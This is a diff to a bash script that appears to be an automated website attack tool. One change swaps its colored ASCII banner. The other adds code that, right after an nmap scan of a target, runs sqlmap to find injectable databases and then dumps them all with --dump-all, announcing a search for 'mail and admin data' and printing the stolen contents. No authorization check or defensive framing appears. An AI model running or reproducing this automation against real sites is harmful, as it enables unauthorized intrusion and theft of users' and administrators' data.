@@ -47,13 +47,14 @@ install_tools() {
 print_header() {
     local colors=('\033[91m' '\033[93m' '\033[92m' '\033[94m' '\033[95m' '\033[96m')
     local header="
-       .   .   ____                   _   .___________.  __   .______      
-|  | |  \\ |  |  /      ||  |  |  | |  |        /   \\  |           | /  __  \\  |   _  \\     
-|  | |   \\|  | |  ,----'|  |  |  | |  |       /  ^  \\ `---|  |----`|  |  |  | |  |_)  |    
-|  | |  . \`  | |  |     |  |  |  | |  |      /  /_\\  \\    |  |     |  |  |  | |      /     
-|  | |  |\\   | |  \`----.|  \`--'  | |  \`----./  _  \\   |  |     |  \`--'  | |  |\\  \\----.
-|__| |__| \\__|  \\______| \\______/  |_______/__/     \\__\\  |__|      \\______/  | _| \`._____|
-    "
+ ___   ___   ________   _______    _______    ________   ______       
+/__/\ /__/\ /_______/\ /______/\  /______/\  /_______/\ /_____/\      
+\::\ \\  \ \\::: _  \ \\::::__\/__\::::__\/__\::: _  \ \\:::_ \ \     
+ \::\/_\ .\ \\::(_)  \ \\:\ /____/\\:\ /____/\\::(_)  \ \\:(_) ) )_   
+  \:: ___::\ \\:: __  \ \\:\\_  _\/ \:\\_  _\/ \:: __  \ \\: __ `\ \  
+   \: \ \\::\ \\:.\ \  \ \\:\_\ \ \  \:\_\ \ \  \:.\ \  \ \\ \ `\ \ \ 
+    \__\/ \::\/ \__\/\__\/ \_____\/   \_____\/   \__\/\__\/ \_\/ \_\/ 
+                                                                     "
     for color in "${colors[@]}"; do
         echo -e "$color$header"
         sleep 0.5
@@ -110,6 +111,16 @@ scan_website() {
     # Perform a scan using Nmap
     local nmap_scan_file="$results_dir/nmap_scan.txt"
     save_to_file "$nmap_scan_file" "$(nmap -sV -sC -Pn "$target_url")"
+
+    # Execute SQL injection using sqlmap
+    if sqlmap -u "$target_url" --dbs; then
+        echo "SQL injection successful. Searching for mail and admin data..."
+        local sql_data_file="$results_dir/sql_data.txt"
+        save_to_file "$sql_data_file" "$(sqlmap -u "$target_url" --dump-all)"
+        cat "$sql_data_file"
+    else
+        echo "Failed to execute SQL injection."
+    fi
 
     # Clear the screen
     clear_screen
